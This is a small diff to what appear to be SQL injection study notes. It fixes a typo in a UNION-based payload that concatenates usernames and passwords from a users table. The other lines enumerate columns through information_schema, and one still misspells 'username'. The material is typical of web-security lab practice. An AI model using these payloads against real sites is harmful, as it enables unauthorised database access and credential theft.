@@ -12,4 +12,4 @@ Gifts' union select NULL,column_name from information_schema.columns where table
 
 Gifts' union select useranem,password from users-- -
 
-' union select NULL, concat(username,':',passoword) from users-- - -> ':' It depends on the site =)
+' union select NULL, concat(username,':',password) from users-- - -> ':' It depends on the site =)
